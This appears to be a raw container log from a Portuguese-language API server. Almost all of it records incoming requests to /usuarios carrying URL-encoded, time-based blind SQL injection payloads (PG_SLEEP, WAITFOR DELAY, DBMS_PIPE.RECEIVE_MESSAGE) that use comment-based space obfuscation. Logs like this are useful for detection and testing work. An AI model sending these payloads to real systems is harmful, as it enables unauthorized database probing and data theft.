api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F3426%3D%28SELECT%2F%2A%2A%2F3426%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FfjmT HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%289426%3D9426 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dpTG%27%3D%27dpTG HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27kQos%27%3D%27kQos HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FQxjW HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2866%29%7C%7CCHR%28110%29%7C%7CCHR%2877%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288330%3D8330 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2866%29%7C%7CCHR%28110%29%7C%7CCHR%2877%29%7C%7CCHR%28122%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2866%29%7C%7CCHR%28110%29%7C%7CCHR%2877%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27AFdz%27%3D%27AFdz HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F7009%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2866%29%7C%7CCHR%28110%29%7C%7CCHR%2877%29%7C%7CCHR%28122%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27WgAs%27%3D%27WgAs HTTP/1.1
